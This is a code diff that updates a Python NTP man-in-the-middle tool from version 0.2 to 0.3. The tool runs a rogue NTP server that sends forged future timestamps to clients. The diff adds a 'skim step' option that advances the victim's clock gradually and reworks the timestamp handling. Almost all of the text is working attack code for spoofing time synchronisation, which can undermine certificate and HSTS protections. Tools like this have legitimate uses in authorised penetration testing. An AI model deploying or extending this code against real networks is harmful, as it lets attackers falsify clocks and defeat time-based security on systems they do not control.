@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # NTP MitM Tool
 # Jose Selvi - jselvi[a.t]pentester[d0.t]es - http://www.pentester.es
-# Version 0.2 - 12/Sept/2014
-# 	- Added "force_step", "force_date" and "force_random" (previously hardcoded).
+# Version 0.3 - 17/Sept/2014
+# 	- Added "skim_step" (previously hardcoded).
 
 from optparse import OptionParser
 import socket
@@ -32,6 +32,7 @@ class NTProxy( threading.Thread ):
 	# Stop Flag
 	stopF = False
 	# Force Step or date
+	skim_step     = float(0)
 	forced_step   = float(0)
 	forced_date   = float(0)
 	forced_random = False
@@ -47,15 +48,19 @@ class NTProxy( threading.Thread ):
 		self.socket.settimeout(5.0)	# Needed: If not socket.recvfrom() waits forever
 
 	# Force step or date
-	def force_step( self, step ):
+	def str2sec( self, mystr ):
 		secs_in = {'s':1, 'm':60, 'h':3600, 'd':86400, 'w':604800, 'M':2629743, 'y':31556926}
-		if step[-1] in secs_in.keys():
-			num = int(step[:-1])
-			mag = secs_in[step[-1]]
+		if mystr[-1] in secs_in.keys():
+			num = int(mystr[:-1])
+			mag = secs_in[mystr[-1]]
 		else:
-			num = int(step)
+			num = int(mystr)
 			mag = 1
-		self.forced_step = float(mag * num)
+		return float(mag * num)
+	def set_skim_step( self, skim ):
+		self.skim_step = self.str2sec(skim) - 2 # 2s threshold
+	def force_step( self, step ):
+		self.forced_step = self.str2sec(step)
 	def force_date( self, date ):
 		if len(date) == len('2014-01-01 05:32'):
 			pat = '%Y-%m-%d %H:%M'
@@ -91,13 +96,16 @@ class NTProxy( threading.Thread ):
 		self.step = future_time - current_time
 
 	# Select a new time in the future
-	def newtime( self ):
-		if self.forced_date == 0:
-			current_time = time.time()
-			future_time = (current_time + self.step) + self.ntp_delta
+	def newtime( self, timestamp ):# JSELVI
+		current_time	= time.time()
+		skim_time	= timestamp + self.skim_step
+		future_time	= current_time + self.step
+		if self.forced_date == 0 and ( skim_time > future_time ):
 			return future_time
+		elif self.forced_date != 0 and ( skim_time > self.forced_date ):
+			return self.forced_date
 		else:
-			return self.forced_date + self.ntp_delta
+			return skim_time
 
 	# Stop Method
 	def stop( self ):
@@ -111,21 +119,21 @@ class NTProxy( threading.Thread ):
 			try:
 				data,source = self.socket.recvfrom(1024)
 				info = self.extract( data )
-				timestamp = self.newtime()
+				timestamp = self.newtime( info['tx_timestamp'] - self.ntp_delta )
 				fingerprint,data = self.response( info, timestamp )
 				socket.sendto( data, source )
 				# Only print if it's the first packet
 				epoch_now = time.time()
-				if ( not source[0] in self.seen ) or ( (source[0] in self.seen) and (epoch_now - self.seen[source[0]]) > 2 ):
+				if ( not source[0] in self.seen ) or ( (source[0] in self.seen) and (epoch_now - self.seen[source[0]]) > 5 ):
 					if self.forced_random:
 						self.select_step()
 					self.seen[source[0]] = epoch_now
 					# Year-Month-Day Hour:Mins
-					aux = time.gmtime(timestamp-self.ntp_delta)
+					aux = time.gmtime(timestamp)
 					future_time = str(aux[0])+'-'+str(aux[1])+'-'+str(aux[2])+' '+str(aux[3])+':'+str(aux[4])
 					aux = time.gmtime(time.time())
 					current_time = str(aux[3])+':'+str(aux[4])+':'+str(aux[5])
-					print fingerprint + ' detected!'
+					#print fingerprint + ' detected!'
 					print "[%s] Sended to %s:%d - Going to the future! %s" % (current_time,source[0],source[1],future_time)
 			except:
 				continue
@@ -169,6 +177,7 @@ class NTProxy( threading.Thread ):
 	def generate_param( self, info, timestamp ):
 		# Format from https://github.com/limifly/ntpserver/
 		# Define response params
+		ntp_timestamp = timestamp + self.ntp_delta
 		param = {}
 		param['ID'] = 'Unknown'
 		param['leap'] = 0			# No warnings, no errors
@@ -180,12 +189,12 @@ class NTProxy( threading.Thread ):
 		param['root_delay'] = 0
 		param['root_dispersion'] = 0
 		param['ref_id'] = info['ref_id']
-		param['ref_timestamp'] = timestamp - 5
+		param['ref_timestamp'] = ntp_timestamp - 5
 		param['orig_timestamp'] = 0
 		param['orig_timestamp_high'] = info['tx_timestamp_high']
 		param['orig_timestamp_low'] = info['tx_timestamp_low']
-		param['recv_timestamp'] = timestamp
-		param['tx_timestamp'] = timestamp
+		param['recv_timestamp'] = ntp_timestamp
+		param['tx_timestamp'] = ntp_timestamp
 		param['tx_timestamp_high'] = 0
 		param['tx_timestamp_low'] = 0
 		return param
@@ -253,8 +262,9 @@ parser = OptionParser(usage=usage)
 parser.add_option("-i",  "--interface",   type="string",        dest="interface", default="0.0.0.0", help="Listening interface")
 parser.add_option("-p",  "--port",        type="int",           dest="port",      default="123",     help="Listening port")
 parser.add_option("-n",  "--nobanner",    action="store_false", dest="banner",    default=True,      help="Not show Delorean banner")
-parser.add_option("-s", "--force-step",  type="string",         dest="step",                         help="Force the time step: 3m (minutes), 4d (days), 1M (month)")
-parser.add_option("-d", "--force-date",  type="string",         dest="date",                         help="Force the date: YYYY-MM-DD hh:mm[:ss]")
+parser.add_option("-s", "--force-step",   type="string",        dest="step",                         help="Force the time step: 3m (minutes), 4d (days), 1M (month)")
+parser.add_option("-d", "--force-date",   type="string",        dest="date",                         help="Force the date: YYYY-MM-DD hh:mm[:ss]")
+parser.add_option("-k", "--skim-step",    type="string",        dest="skim",                         help="Skimming step: 3m (minutes), 4d (days), 1M (month)")
 parser.add_option("-r",  "--random-date", action="store_true",  dest="random",    default=False,     help="Use random date each time")
 (options, args) = parser.parse_args()
 ifre = re.compile('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
@@ -265,9 +275,11 @@ if (
 	not options.interface or not ifre.match(options.interface) or
 	options.port < 1 or options.port > 65535 or
 	( options.step and options.date ) or
+	( options.skim and not (options.step or options.date) ) or
 	( options.random and (options.step or options.date) ) or
 	( options.step and not fsre.match(options.step) ) or
-	( options.date and not fdre.match(options.date) )
+	( options.date and not fdre.match(options.date) ) or
+	( options.skim and not fsre.match(options.skim) )
    ):
         parser.print_help()
         exit()
@@ -279,6 +291,8 @@ NTP_Thread = NTProxy(socket)
 if options.random:
 	NTP_Thread.force_random(True)
 else:
+	if options.skim:
+		NTP_Thread.set_skim_step( options.skim )
 	if options.step:
 		NTP_Thread.force_step( options.step )
 	if options.date:
